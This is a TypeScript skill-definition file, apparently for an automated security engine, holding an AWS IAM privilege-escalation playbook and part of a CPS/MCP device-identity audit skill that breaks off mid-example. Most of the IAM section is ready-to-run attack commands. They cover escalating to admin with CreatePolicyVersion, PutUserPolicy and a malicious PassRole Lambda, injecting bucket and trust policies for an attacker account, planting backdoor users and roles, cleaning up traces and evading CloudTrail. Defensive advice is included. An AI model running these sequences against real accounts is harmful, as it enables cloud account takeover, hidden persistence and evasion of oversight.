/**
 * HOS-Sec-Engine V2 - IAM Privilege Escalation Techniques
 * IAM 权限提升专项 Skill
 */

import { AttackDefenseSkill, DEFAULT_SKILL_RUNTIME } from '../../../types/skill';

export const iamPrivilegeEscalationSkills: AttackDefenseSkill[] = [
    {
        metadata: {
            id: 'cloud-iam-001',
            name: 'IAM Privilege Escalation Techniques',
            category: 'cloud',
            subCategory: 'iam',
            riskLevel: 'critical',
            confidence: 0.96,
            updatedAt: '2026-06',
            author: 'HOS-Sec-Engine',
            tags: [
                'iam',
                'privilege-escalation',
                'iam-passrole',
                'create-policy-version',
                'assume-role',
                'lambda-role',
                'credential-abuse',
                'resource-based-policy',
                'aws',
                'iam-policy',
                'sts',
                'role-chain',
                'policy-injection',
            ],
        },
        trigger: {
            scenarios: [
                '已获取 AWS IAM 用户的低权限凭证（AccessKey/SecretKey），需要提升到管理员权限',
                '目标 IAM 用户附加了多个 managed policy 和 inline policy，可能存在权限重叠或遗漏',
                '发现目标允许 iam:PassRole 权限，可尝试通过服务角色提升权限',
                '目标 IAM policy 允许 iam:CreatePolicyVersion 且未限制 set-as-default',
                '存在跨账户信任关系，可通过 sts:AssumeRole 进行角色链攻击',
                'Lambda 函数配置了高权限执行角色，可通过修改函数代码以该角色执行',
                '发现 IAM 凭证泄露（GitHub 泄露、配置文件泄露、日志泄露）',
                '资源基础策略（Resource-based Policy）中存在宽松的 Principal 配置',
            ],
            keywords: [
                'iam',
                'privilege escalation',
                '权限提升',
                'passrole',
                'assume-role',
                'create-policy-version',
                'lambda role',
                'credential',
                'access key',
                'managed policy',
                'inline policy',
                'sts',
                'role chain',
                'resource policy',
                'iam policy',
                'admin access',
                'administratoraccess',
            ],
            aliases: [
                'iam escalation',
                'role hijacking',
                'policy abuse',
                'iam takeover',
                'credential escalation',
                'cross-account escalation',
                'iam misconfiguration',
                'lambda privilege escalation',
            ],
            indicators: [
                'IAM 用户权限中包含 iam:* ?iam:CreatePolicyVersion',
                '用户权限中包含 iam:PassRole 和特定服务创建权限（如lambda:CreateFunction',
                '用户权限中包含 sts:AssumeRole 且目标角色权限更高',
                '用户权限中包含 iam:PutUserPolicy ?iam:AttachUserPolicy',
                'Lambda 函数执行角色包含 AdministratorAccess 或高权限策略',
                '发现 AccessKey 但权限有限，需进一步探测可用权限',
            ],
        },
        knowledge: {
            description: 'AWS IAM 权限提升是云渗透测试中的核心技能。当攻击者获取了低权限 IAM 凭证后，通过分析和利用IAM 策略配置错误，可以提升到管理员权限。Rhino Security Labs 定义了 30+ 种IAM 权限提升路径（参考https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/）。最常见的路径包括：(1) iam:CreatePolicyVersion ?创建新版本策略并设为默认;(2) iam:PassRole + 服务创建权限 →通过 Lambda、EC2、Glue 等服务以高权限角色执行代码；(3) sts:AssumeRole ?担任权限更高的角色；(4) iam:PutUserPolicy/AttachUserPolicy ?直接修改自己的策略。此外，资源基础策略（如 S3 bucket policy、SQS queue policy、Lambda resource policy）中的宽松的 Principal 配置也可被利用。权限提升的关键在于枚举当前凭证的有效权限（iam:GetUser、iam:ListAttachedUserPolicies、iam:SimulatePrincipalPolicy），然后找到可提权的路径',
            symptoms: [
                'IAM 用户附加了多个 managed policy，其中至少一个包含 iam: 权限',
                '用户有iam:CreatePolicyVersion 权限但策略文档档中缺少限制条件',
                '用户有iam:PassRole 权限且能列出高权限 IAM 角色',
                '用户有sts:AssumeRole 权限且信任策略未限制 source account',
                'Lambda 函数的执行角色包含 AdministratorAccess 或敏感权限',
                'S3 bucket policy ?SQS queue policy ?Policy 中的 Principal"*" 或包含攻击者账户',
                '用户有iam:UpdateLoginProfile 权限，可修改其他用户的密码',
            ],
            rootCauses: [
                '管理员使用通配符权限（如"Action": "iam:*"）而非最小权限原则',
                '策略中缺少Condition 限制，允许无约束的 iam:CreatePolicyVersion',
                'iam:PassRole 权限未限制具体的角色 ARN 或服务（"Resource": "*")',
                'sts:AssumeRole 信任策略未限制外部账户（允许任意账户 assume)',
                'Lambda 函数创建时使用了高权限角色，且函数代码用户可修改',
                '资源基础策略未正确验证 Principal，导致跨账户权限泄露',
                'IAM policy 版本管理：CreatePolicyVersion 最多允许 5 个版本，攻击者可创建新版本覆盖原有策略',
                'Service Control Policies (SCP) 未正确配置，无法阻止权限提升操作',
            ],
            observations: [
                '使用 iam:GetUser、iam:ListAttachedUserPolicies、iam:ListUserPolicies 枚举当前权限',
                'iam:SimulatePrincipalPolicy 可模拟测试权限，但需要 iam:SimulatePrincipalPolicy 权限本身',
                '使用 Pacu (https://github.com/RhinoSecurityLabs/pacu) 自动化检测和利用 IAM 权限提升路径',
                'AWS Organizations ?SCP 可以在组织级别阻止某些操作，即使 IAM policy 允许',
                'Permissions Boundary 可以限制 IAM 实体能获得的最大权限，即使策略更宽',
                'Lambda 函数代码可以通过环境变量或层（Layers）注入恶意代',
                '某些服务（如 Glue、DataPipeline、SageMaker）允许执行自定义代码，结合 PassRole 可提权',
                '跨账户AssumeRole 链：Account A ?Account B ?Account A (Admin)，形成角色链提升',
            ],
            commonMistakes: [
                '未检查 Permissions Boundary 和 SCP，导致提权路径实际不可用',
                '只关联managed policy，忽略了 inline policy 可能包含额外权限',
                '未考虑资源基础策略（bucket policy、role trust policy）可能放宽权',
                '假设 iam:PassRole 权限足够，但未验证证是否能创建使用该角色的服务',
                '未考虑 MFA 要求，某些角色 require MFA 但攻击者没有',
                '忽略了策略中的 Condition 字段（如 aws:RequestedRegion、aws:SourceIp',
                '只尝试了标准的提权路径，未组合多个低权限操作达到提权效果',
            ],
            notes: [
                'IAM 权限提升的核心思路：枚举 → 分析 → 利用 → 验证',
                '使用 aws sts get-caller-identity 确认当前身份和账户 ID',
                '使用 iam simulating policy 工具可离线分析策略文档件中的潜在提权路径',
                '某些提权路径可能需要多个步骤组合，?iam:CreatePolicyVersion + iam:AttachUserPolicy',
                '提权后应立即创建后门（持久化访问），因为原凭证可能随时被轮换',
                'AWS CloudTrail 会记录所有 IAM 操作，提权操作极易被检测，需注意隐蔽性',
            ],
        },
        action: {
            checklist: [
                '使用 sts:get-caller-identity 确认当前身份、账户 ID ?ARN',
                '枚举当前用户权限：iam:list-attached-user-policies、iam:list-user-policies',
                '获取每个策略的详细内容：iam:get-policy-version',
                '使用 iam:simulate-principal-policy 测试潜在提权权限',
                '检查是否有 iam:CreatePolicyVersion + set-as-default 的提权路径',
                '检查是否有 iam:PassRole 权限，并枚举可用的高权限角色',
                '检查是否有 sts:AssumeRole 权限，并分析目标角色的信任策略',
                '检查是否有 iam:PutUserPolicy/AttachUserPolicy 权限直接提权',
                '检查 Lambda 函数执行角色权限，评估 Lambda 提权路径',
                '检查资源基础策略（S3 bucket policy、SQS policy、Lambda policy)',
                '使用 Pacu 自动化检测和利用所有可用提权路径',
                '提权后验证新权限：aws sts get-caller-identity、aws iam list-users',
            ],
            techniques: [
                'iam:CreatePolicyVersion →创建策略新版本并设为默认，直接修改策略权限',
                'iam:PassRole + lambda:CreateFunction →创建 Lambda 函数以高权限角色执行代码',
                'iam:PassRole + ec2:RunInstances ?创建 EC2 实例以高权限角色执行命令',
                'iam:PassRole + glue:CreateJob ?创建 Glue Job 以高权限角色执行代码',
                'sts:AssumeRole ?直接担任更高权限的角色',
                'iam:PutUserPolicy ?添加 inline policy 到当前用户',
                'iam:AttachUserPolicy ?附加 managed policy 到当前用户',
                'iam:UpdateLoginProfile →修改其他用户的控制台密码',
                'iam:CreateAccessKey →为高权限用户创建新的 AccessKey',
                'iam:AddUserToGroup ?将当前用户加入高权限组',
                '资源基础策略注入 →修改 S3 bucket policy → Lambda resource policy 放宽访问权限',
                '角色链提取 → 通过多个账户间的 AssumeRole 形成角色链',
                'Lambda Layer 注入 ?创建包含恶意代码的Lambda Layer 并附加到目标函数',
            ],
            examples: [
                {
                    name: 'iam:CreatePolicyVersion 权限提升',
                    description: '利用 iam:CreatePolicyVersion 创建新策略版本并设为默认，将当前用户策略修改为管理员权限',
                    content: '# 1. 确认当前用户有CreatePolicyVersion 权限\n' +
                        'aws sts get-caller-identity\n' +
                        'aws iam list-attached-user-policies --user-name current-user\n\n' +
                        '# 2. 获取当前策略ARN（假设为 arn:aws:iam::123456789012:policy/MyPolicy）\n' +
                        'aws iam get-policy-version \\\n' +
                        '  --policy-arn arn:aws:iam::123456789012:policy/MyPolicy \\\n' +
                        '  --version-id v1\n\n' +
                        '# 3. 创建新的策略版本（管理员权限）\n' +
                        'aws iam create-policy-version \\\n' +
                        '  --policy-arn arn:aws:iam::123456789012:policy/MyPolicy \\\n' +
                        '  --policy-document \'{\n' +
                        '    "Version": "2012-10-17",\n' +
                        '    "Statement": [{\n' +
                        '      "Effect": "Allow",\n' +
                        '      "Action": "*",\n' +
                        '      "Resource": "*"\n' +
                        '    }]\n' +
                        '  }\' \\\n' +
                        '  --set-as-default\n\n' +
                        '# 4. 验证新权限已生效\n' +
                        'aws iam list-users\n' +
                        'aws s3 ls\n\n' +
                        '# 注意：每个策略最多 5 个版本，可能需要先删除旧版本\n' +
                        'aws iam delete-policy-version \\\n' +
                        '  --policy-arn arn:aws:iam::123456789012:policy/MyPolicy \\\n' +
                        '  --version-id v1',
                },
                {
                    name: 'iam:PassRole + Lambda 函数权限提升',
                    description: '利用 iam:PassRole ?lambda:CreateFunction 权限，创建以高权限角色执行的 Lambda 函数',
                    content: '# 1. 枚举可用的 IAM 角色\n' +
                        'aws iam list-roles --query "Roles[].{ARN:Arn,Name:RoleName}" --output table\n\n' +
                        '# 2. 检查目标角色的权限（假设为 AdminRole）\n' +
                        'aws iam list-attached-role-policies --role-name AdminRole\n' +
                        'aws iam get-policy-version \\\n' +
                        '  --policy-arn arn:aws:iam::123456789012:policy/AdminPolicy \\\n' +
                        '  --version-id v1\n\n' +
                        '# 3. 确认当前用户有PassRole 权限\n' +
                        'aws iam simulate-principal-policy \\\n' +
                        '  --policy-source-arn arn:aws:iam::123456789012:user/current-user \\\n' +
                        '  --action-names iam:PassRole \\\n' +
                        '  --resource-arns arn:aws:iam::123456789012:role/AdminRole\n\n' +
                        '# 4. 创建恶意 Lambda 函数代码\n' +
                        'cat > exploit.py << \'PYEOF\'\n' +
                        'import boto3, json\n' +
                        'def lambda_handler(event, context):\n' +
                        '    client = boto3.client("iam")\n' +
                        '    # 创建新的管理员策略\n' +
                        '    client.create_policy(\n' +
                        '        PolicyName="BackdoorPolicy",\n' +
                        '        PolicyDocument=json.dumps({\n' +
                        '            "Version": "2012-10-17",\n' +
                        '            "Statement": [{\n' +
                        '                "Effect": "Allow",\n' +
                        '                "Action": "*",\n' +
                        '                "Resource": "*"\n' +
                        '            }]\n' +
                        '        })\n' +
                        '    )\n' +
                        '    return {"status": "done"}\n' +
                        'PYEOF\n\n' +
                        'zip exploit.zip exploit.py\n\n' +
                        '# 5. 创建 Lambda 函数（使用 AdminRole）\n' +
                        'aws lambda create-function \\\n' +
                        '  --function-name escalate \\\n' +
                        '  --runtime python3.9 \\\n' +
                        '  --role arn:aws:iam::123456789012:role/AdminRole \\\n' +
                        '  --handler exploit.lambda_handler \\\n' +
                        '  --zip-file fileb://exploit.zip\n\n' +
                        '# 6. 触发函数执行\n' +
                        'aws lambda invoke --function-name escalate response.json\n\n' +
                        '# 7. 清理痕迹\n' +
                        'aws lambda delete-function --function-name escalate\n' +
                        'rm exploit.py exploit.zip',
                },
                {
                    name: 'sts:AssumeRole 角色链提',
                    description: '通过 sts:AssumeRole 担任更高权限的角色，可能涉及多账户角色链',
                    content: '# 1. 发现可用的角色和信任关系\n' +
                        'aws iam list-roles --query "Roles[].{ARN:Arn,TrustPolicy:AssumeRolePolicyDocument}" \\\n' +
                        '  --output json | jq \'.[] | select(.TrustPolicy.Statement[].Principal.AWS | contains("123456789012"))\'\n\n' +
                        '# 2. 检查目标角色的信任策略\n' +
                        'aws iam get-role --role-name TargetRole --query "Role.AssumeRolePolicyDocument"\n\n' +
                        '# 3. 如果信任策略包含当前账户或用户，执行 AssumeRole\n' +
                        'aws sts assume-role \\\n' +
                        '  --role-arn arn:aws:iam::123456789012:role/TargetRole \\\n' +
                        '  --role-session-name escalation-session\n\n' +
                        '# 4. 获取临时凭证\n' +
                        '# 返回: {AccessKeyId, SecretAccessKey, SessionToken}\n\n' +
                        '# 5. 使用临时凭证\n' +
                        'export AWS_ACCESS_KEY_ID={AccessKeyId}\n' +
                        'export AWS_SECRET_ACCESS_KEY={SecretAccessKey}\n' +
                        'export AWS_SESSION_TOKEN={SessionToken}\n' +
                        'aws sts get-caller-identity\n\n' +
                        '# 6. 跨账户角色链\n' +
                        '# Account A (当前) → AssumeRole → Account B (中间) → AssumeRole → Account A (管理员)\n' +
                        'aws sts assume-role \\\n' +
                        '  --role-arn arn:aws:iam::999999999999:role/CrossAccountRole \\\n' +
                        '  --role-session-name chain-1\n\n' +
                        '# 使用 Account B 的凭证继续\n' +
                        'aws sts assume-role \\\n' +
                        '  --role-arn arn:aws:iam::123456789012:role/AdminRole \\\n' +
                        '  --role-session-name chain-2\n\n' +
                        '# 7. 注意检查角色是否要求 MFA\n' +
                        '# 如果 trust policy 中有 "Condition": {"Bool": {"aws:MultiFactorAuthPresent": "true"}}\n' +
                        '# 则需要 MFA token 才能 assume',
                },
                {
                    name: 'iam:PutUserPolicy 直接策略注入',
                    description: '利用 iam:PutUserPolicy ?iam:AttachUserPolicy 直接向当前用户添加管理员策略',
                    content: '# 1. 确认当前用户有PutUserPolicy 权限\n' +
                        'aws sts get-caller-identity\n\n' +
                        '# 2. 使用 PutUserPolicy 添加 inline policy\n' +
                        'aws iam put-user-policy \\\n' +
                        '  --user-name $(aws sts get-caller-identity --query "Arn" --output text | cut -d/ -f2) \\\n' +
                        '  --policy-name escalation-policy \\\n' +
                        '  --policy-document \'{\n' +
                        '    "Version": "2012-10-17",\n' +
                        '    "Statement": [{\n' +
                        '      "Effect": "Allow",\n' +
                        '      "Action": "*",\n' +
                        '      "Resource": "*"\n' +
                        '    }]\n' +
                        '  }\'\n\n' +
                        '# 3. 或使用 AttachUserPolicy 附加 managed policy\n' +
                        'aws iam attach-user-policy \\\n' +
                        '  --user-name $(aws sts get-caller-identity --query "Arn" --output text | cut -d/ -f2) \\\n' +
                        '  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n\n' +
                        '# 4. 验证权限已生效\n' +
                        'aws iam list-users\n' +
                        'aws ec2 describe-instances\n\n' +
                        '# 5. 持久化：创建新的 AccessKey\n' +
                        'aws iam create-access-key \\\n' +
                        '  --user-name $(aws sts get-caller-identity --query "Arn" --output text | cut -d/ -f2)\n\n' +
                        '# 6. 或为 root 账户创建 AccessKey（如果可能）\n' +
                        'aws iam create-access-key --user-name root',
                },
                {
                    name: '资源基础策略（Resource-based Policy）利',
                    description: '利用 S3 bucket policy、SQS queue policy ?Lambda resource policy 中的宽松配置获取权限',
                    content: '# 1. 检查 S3 bucket policy 中是否有宽松 Principal\n' +
                        'aws s3api get-bucket-policy --bucket target-bucket --output text | jq\n\n' +
                        '# 2. 如果 bucket policy 允许 PutBucketPolicy，注入新策略\n' +
                        'aws s3api put-bucket-policy --bucket target-bucket --policy \'{\n' +
                        '  "Version": "2012-10-17",\n' +
                        '  "Statement": [{\n' +
                        '    "Sid": "Backdoor",\n' +
                        '    "Effect": "Allow",\n' +
                        '    "Principal": {"AWS": "arn:aws:iam::ATTACKER-ACCOUNT-ID:root"},\n' +
                        '    "Action": "s3:*",\n' +
                        '    "Resource": ["arn:aws:s3:::target-bucket", "arn:aws:s3:::target-bucket/*"]\n' +
                        '  }]\n' +
                        '\'}\'\n\n' +
                        '# 3. 检查 SQS queue policy\n' +
                        'aws sqs get-queue-attributes \\\n' +
                        '  --queue-url https://sqs.us-east-1.amazonaws.com/123456789012/my-queue \\\n' +
                        '  --attribute-names Policy\n\n' +
                        '# 4. 检查 Lambda resource policy\n' +
                        'aws lambda get-policy --function-name target-function\n\n' +
                        '# 5. 如果 Lambda resource policy 允许 lambda:InvokeFunction\n' +
                        '# 可调用目标函数，可能触发敏感操作\n' +
                        'aws lambda invoke \\\n' +
                        '  --function-name target-function \\\n' +
                        '  --payload \'{"action": "admin"}\' \\\n' +
                        '  response.json\n\n' +
                        '# 6. 利用 IAM Role Trust Policy\n' +
                        '# 如果角色信任策略Principal 为任意账户（未限制ExternalId）\n' +
                        '# 可从外部账户 assume 该角色\n' +
                        'aws sts assume-role \\\n' +
                        '  --role-arn arn:aws:iam::123456789012:role/VulnerableRole \\\n' +
                        '  --role-session-name cross-account-attack',
                },
                {
                    name: 'IAM 凭证滥用与持久化',
                    description: '利用已获取的 IAM 凭证进行权限探测、横向移动和持久化访问',
                    content: '# 1. 确认当前身份和权限范围\n' +
                        'aws sts get-caller-identity\n\n' +
                        '# 2. 枚举所有 IAM 用户和角色\n' +
                        'aws iam list-users --query "Users[].{Name:UserName,ARN:Arn}"\n' +
                        'aws iam list-roles --query "Roles[].{Name:RoleName,ARN:Arn}"\n\n' +
                        '# 3. 枚举所有策略\n' +
                        'aws iam list-policies --scope Local --query "Policies[].Arn"\n\n' +
                        '# 4. 检查 EC2 实例配置文件（可能包含高权限角色）\n' +
                        'aws ec2 describe-instances --query "Reservations[].Instances[].IamInstanceProfile"\n\n' +
                        '# 5. 检查是否存在 Lambda 函数可修改\n' +
                        'aws lambda list-functions --query "Functions[].{Name:FunctionName,Role:Role}"\n\n' +
                        '# 6. 持久化方式 1：创建新的 IAM 用户\n' +
                        'aws iam create-user --user-name backdoor-user\n' +
                        'aws iam attach-user-policy \\\n' +
                        '  --user-name backdoor-user \\\n' +
                        '  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n' +
                        'aws iam create-access-key --user-name backdoor-user\n\n' +
                        '# 7. 持久化方式 2：修改现有用户的策略\n' +
                        'aws iam put-user-policy \\\n' +
                        '  --user-name admin-user \\\n' +
                        '  --policy-name backdoor \\\n' +
                        '  --policy-document \'{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}\'\n\n' +
                        '# 8. 持久化方式 3：创建 IAM 角色\n' +
                        'aws iam create-role \\\n' +
                        '  --role-name backdoor-role \\\n' +
                        '  --assume-role-policy-document \'{\n' +
                        '    "Version": "2012-10-17",\n' +
                        '    "Statement": [{\n' +
                        '      "Effect": "Allow",\n' +
                        '      "Principal": {"AWS": "arn:aws:iam::ATTACKER-ACCOUNT-ID:root"},\n' +
                        '      "Action": "sts:AssumeRole"\n' +
                        '    }]\n' +
                        '  }\'\n' +
                        'aws iam attach-role-policy \\\n' +
                        '  --role-name backdoor-role \\\n' +
                        '  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess',
                },
                {
                    name: '使用 Pacu 自动化 IAM 权限提升',
                    description: '使用 Pacu 框架自动化检测和利用 IAM 权限提升路径',
                    content: '# 1. 安装 Pacu\n' +
                        'pip install pacu\n' +
                        'pacu\n\n' +
                        '# 2. 配置已获取的凭证\n' +
                        'Pacu (my_session) > set_keys\n' +
                        'Please input an Access Key ID: AKIAxxxxxxxxxxxx\n' +
                        'Please input a Secret Access Key: xxxxxxxxxxxxxxxxxxxxxx\n' +
                        'Please input a Session Token (optional): xxxxxxx\n' +
                        'Please input a region (optional, default: us-east-1):\n\n' +
                        '# 3. 枚举当前权限\n' +
                        'Pacu (my_session) > run iam__enum_permissions\n' +
                        '# 输出当前用户的所有权限列表\n\n' +
                        '# 4. 检测权限提升路径\n' +
                        'Pacu (my_session) > run iam__privesc_scan\n' +
                        '# 自动检测所有可用的提权路径并列出利用方法\n\n' +
                        '# 5. 执行提权\n' +
                        'Pacu (my_session) > run iam__privesc_scan --privesc\n' +
                        '# 自动执行检测到的提权路径\n\n' +
                        '# 6. 查看可用模块\n' +
                        'Pacu (my_session) > ls\n' +
                        '# 常用模块:\n' +
                        '#   iam__enum_users - 枚举 IAM 用户\n' +
                        '#   iam__enum_roles - 枚举 IAM 角色\n' +
                        '#   iam__backdoor_assume_role - 在角色中创建后门\n' +
                        '#   lambda__backdoor_new_roles - 为新角色添加后门策略\n' +
                        '#   ec2__startup_shell_script - 通过 EC2 user-data 执行命令\n\n' +
                        '# 7. 导出结果\n' +
                        'Pacu (my_session) > export_creds\n' +
                        '# 导出提权后获取的所有凭证',
                },
            ],
        },
        validation: {
            indicators: [
                'CreatePolicyVersion 返回成功set-as-default 生效',
                'Lambda 函数创建成功并能以目标角色执',
                'sts:AssumeRole 返回临时凭证（AccessKeyId、SecretAccessKey、SessionToken',
                'PutUserPolicy 返回成功，当前用户策略已更新',
                '资源基础策略修改成功，跨账户访问生效',
                'Pacu iam__privesc_scan 检测到可用提权路径',
            ],
            successSigns: [
                '成功获取 AdministratorAccess 或等效高权限',
                '能够列出所有 IAM 用户和角色（之前无法访问',
                '能够创建/删除 IAM 实体（用户、角色、策略）',
                '能够访问 S3、EC2 等其他 AWS 服务的所有资',
                'sts:get-caller-identity 显示已切换到高权限角色',
                '临时凭证在有效期内且权限正确',
            ],
            falsePositiveSigns: [
                '权限包含 iam:CreatePolicyVersion 但策略有 Condition 限制（如 ip-address 条件',
                'iam:PassRole 权限存在但目标角色 trust policy 不允许当前用户assume',
                'sts:AssumeRole 需要 MFA 但当前凭证未启用 MFA',
                'Permissions Boundary 限制了策略能授予的最大权限范围',
                'SCP（Service Control Policy）在组织级别阻止了提权操作',
                '角色 →maximum session duration 限制，临时凭证有效期短',
            ],
        },
        defense: {
            recommendations: [
                '遵循最小权限原则，禁止使用 "Action": "*" ?"iam:*" 通配符策略',
                '?iam:CreatePolicyVersion 添加 Condition 限制（如要求 MFA、限制特定 IP',
                '严格限制 iam:PassRole 权限：指定具体角色 ARN 和服务，禁止 "Resource": "*"',
                '在角色信任策略中使用 ExternalId 防止 confused deputy 攻击',
                '启用 AWS Organizations SCP 在组织级别阻止危险 IAM 操作',
                '为所有 IAM 实体设置 Permissions Boundary，限制最大权限范围',
                '定期审查 IAM 策略，使用 IAM Access Analyzer 检测过度授权',
                '启用 CloudTrail 对所有 IAM 操作进行日志记录和告警',
                '对敏感角色启用 MFA 要求：Condition": {"Bool": {"aws:MultiFactorAuthPresent": "true"}}',
                '使用 AWS IAM credential report 定期检查未使用的凭证',
                '实施 IAM policy 版本管理审计，监控策略版本变',
                '限制 sts:AssumeRole 的信任策略，明确指定允许的 Principal 和 Condition 中的 PrincipalCondition',
            ],
            mitigations: [
                '立即轮换所有可能泄露的 IAM 凭证',
                '删除或禁用可疑的 IAM 用户和角',
                '审查 CloudTrail 日志，识别提权操作的时间线和影响范围',
                '恢复被修改的 IAM 策略到安全版',
                '启用 MFA Delete 防止策略被意外或恶意修改',
                '对受影响的服务启用 VPC 端点策略限制访问',
                '使用 AWS Config 规则持续监控 IAM 配置合规',
                '如果检测到攻击者创建了后门角色/用户，立即删除并审计关联操作',
            ],
            references: [
                'https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/',
                'https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies.html',
                'https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use.html',
                'https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_delegate-permissions.html',
                'https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_boundaries.html',
                'https://docs.aws.amazon.com/organizations/latest/userguide/orgs_manage_policies_scps.html',
                'https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer.html',
                'https://github.com/RhinoSecurityLabs/pacu',
                'https://awslabs.github.io/prowler/',
                'https://docs.aws.amazon.com/IAM/latest/UserGuide/cloudtrail-integration.html',
            ],
        },
        quality: {
            confidence: 0.96,
            reviewed: true,
            tested: true,
            lastVerified: '2026-06',
        },
        playbooks: ['cloud-config-audit'],
        phase: 'permission-testing',
        enabled: true,
        runtime: {
            requiresAgent: false,
            agentCount: 1,
            parallelizable: true,
            requiresNetwork: true,
            requiresSandbox: false,
            dependencies: [],
            estimatedTokens: 3000,
        },
    },
    {
        metadata: {
            id: 'cloud-iam-002',
            name: 'CPS Device Identity and Trust Chain Verification',
            category: 'cloud',
            subCategory: 'iam',
            riskLevel: 'high',
            confidence: 0.86,
            updatedAt: '2026-06',
            author: 'HOS-Sec-Engine',
            tags: [
                'cps', 'device-identity', 'trust-chain',
                'iot-certificate', 'edge-security',
                'provenance', 'physics-grounded',
                'sensor-auth', 'overlay-network',
                'pki', 'mcp-identity',
            ],
        },
        trigger: {
            scenarios: [
                'CPS 设备（传感器/执行器/边缘节点）需要向云 IAM 进行身份注册',
                'IoT 设备证书管理存在部署和轮换问题',
                '覆盖网络中边缘节点间的信任链验证',
                '传感器数据链路的来源完整性验证',
                'MCP 协议在云-边-端架构中的身份管理',
                '物理设备的身份与其数字身份绑定验证',
            ],
            keywords: [
                'device identity', 'cps iam', 'iot certificate',
                'edge trust', 'sensor provenance',
                '设备身份', '信任链', '证书管理',
                'mcp identity', 'physics grounded',
            ],
            aliases: [
                'CPS device trust audit',
                'CPS 设备身份审计',
                'edge identity verification',
                'sensor provenance check',
            ],
            indicators: [
                'CPS 设备使用默认证书或硬编码凭证',
                '设备证书过期但未被轮换',
                '边缘节点间通信缺乏双向 TLS',
                '传感器数据链路缺乏来源签名',
                'MCP 通信中身份声明未被验证',
                '设备身份与物理位置绑定不完整',
            ],
        },
        knowledge: {
            description: 'CPS (信息物理系统)中的设备身份和信任链管理是保障 AI Agent 决策可靠性的基础。SENTINEL 综述强调基于来源(provenance)和物理基础(physics-grounded)的可信机制是 CPS 安全的核心。本技能覆盖：边缘设备证书管理审计、覆盖网络信任链验证、传感器数据来源完整性检测、MCP 协议在 CPS 中的身份声明验证、云-边-端统一身份管理等场景。',
            symptoms: [
                '设备使用自签名证书但未建立 CA 信任链',
                '传感器数据在传输链路中未被签名',
                '边缘节点身份被仿冒但未被检测',
                '设备证书私钥存储在非安全介质中',
                'MCP 服务端接受任何客户端的身份声明',
            ],
            rootCauses: [
                'CPS 设备数量庞大导致证书管理复杂，运维人员默认关闭验证',
                '边缘设备算力有限，PKI 完整验证影响实时性',
                '传感器硬件缺乏安全元素（Secure Element/TPM）',
                '跨域信任（云-边-端）缺乏统一身份框架',
                'MCP 协议默认无身份管理机制（需 SMCP 扩展）',
            ],
            observations: [
                'SMCP 的可信组件注册表(TCR)可统一管理 CPS 设备身份',
                '设备身份应绑定物理不可克隆函数(PUF)或 TPM',
                '传感器数据签名需在微秒级完成以满足 CPS 实时性',
                '覆盖网络的 WireGuard/IPSec 证书管理常被忽略',
                'MCP 与 SMCP 的身份互认是云边端一体化关键',
            ],
            commonMistakes: [
                '将 IT 设备的证书管理方案直接套用到 IoT/CPS 设备',
                '忽略边缘设备的证书轮换机制（设备远程更新困难）',
                '仅验证设备身份而不验证传感器数据的来源完整性',
                '在 MCP 通信中信任客户端声明的身份而不验证',
                'CPS 设备删除后未及时从信任注册表中移除',
            ],
            notes: [
                'CPS 设备身份验证失败可导致 AI Agent 基于伪造数据做出危险决策',
                '建议与 cps-ai-security-001 配合进行完整 CPS 安全评估',
                'SMCP 论文提供了 CPS 场景下的身份管理参考架构',
                '设备证书自动化轮换是 CPS IAM 的关键实践',
            ],
        },
        action: {
            checklist: [
                '** 审计设备证书: 检查所有 CPS 设备证书的有效期、签名链和私钥保护',
                '** 验证覆盖网络: 测试 WireGuard/IPSec 节点间的双向认证配置',
                '** 测试传感器数据签名: 验证传感器数据的来源签名和完整性',
                '** MCP 身份声明测试: 测试 MCP 通信中的身份声明是否被验证',
                '** 评估证书轮换: 检查设备的自动证书轮换机制是否可用',
                '** 测试设备撤销: 撤销设备证书后验证其是否仍能被信任',
                '** 验证物理绑定: 测试设备的数字身份与物理唯一标识的绑定',
            ],
            techniques: [
                '证书链验证：检查设备证书 → 中间 CA → 根 CA 的完整链',
                '私钥存储审计：检查设备私钥是否存储在 TPM/Secure Element 中',
                '覆盖网络证书测试：测试 WireGuard/IPSec 节点证书的认证强度',
                '传感器数据签名验证：注入未签名的传感器数据测试是否被接受',
                'MCP 身份声明伪造：构造伪造的身份声明测试 MCP 服务端验证',
                '设备证书轮换测试：触发证书轮换机制验证自动化流程',
                '物理绑定验证：检查设备 ID 与 TPM/PUF 的绑定强度',
            ],
            examples: [
                {
                    name: 'MCP CPS 设备身份声明伪造',
                    description: '测试 MCP 服务端是否验证客户端的身份声明（基于 SMCP 威胁模型）',
                    content:
                        '攻击场景: CPS 边缘节点通过 MCP 向云端上报传感器数据\n' +
                        '\n' +
                        '攻击步骤:\n' +
                        '1. 捕获合法 MCP 客户端的身份声明（agentId / deviceId）\n' +
                        '2. 伪造身份声明连接 MCP 服务端:\n' +
                        '   {\n' +
                        '     "agentId": "sensor-node-007",\n' +
                        '     "deviceId": "temperature-sensor-bay-3",\n' +
                        '     "riskLevel": "low"\n' +
                        '   }\n' +
                        '3. 发送伪造的传感器数据:\n' +
                        '   {\n' +
                        '     "temperature": 45.2,  // 实际85°C\n' +
                        '     "signature": "[重放的合法签名]"\n' +
                        '   }\n' +
                        '4. 如果服务端未验证身份声明直接处理数据 → 设备身份仿冒成功\n' +
                        '\n' +
                        '修复: MCP 服务端使用 SMCP 可信组件注册表验证身份声明\n' +
                        '配合: mcp-security-audit-001',
                },
                {
                    name: '传感器数据来源完整性测试',
                    description: '测试 CPS 系统是否验证传感器数据的来源和完整性',
                    content:
                        '测试步骤:\n' +
                        '1. 在传感器到边缘网关的通信链路上旁路注入数据包\n' +
                        '2. 发送包含以下内容的伪造数据:\n' +
                        '   - 未签名的传感器读数\n' +
                        '   - 使用其他传感器的签名但数据内容不同\n' +
                        '   - 重放之前捕获的合法数据包\n' +
                        '3. 观察 AI Agent 是否接受伪造数据并更新决策\n' +
                        '\n' +
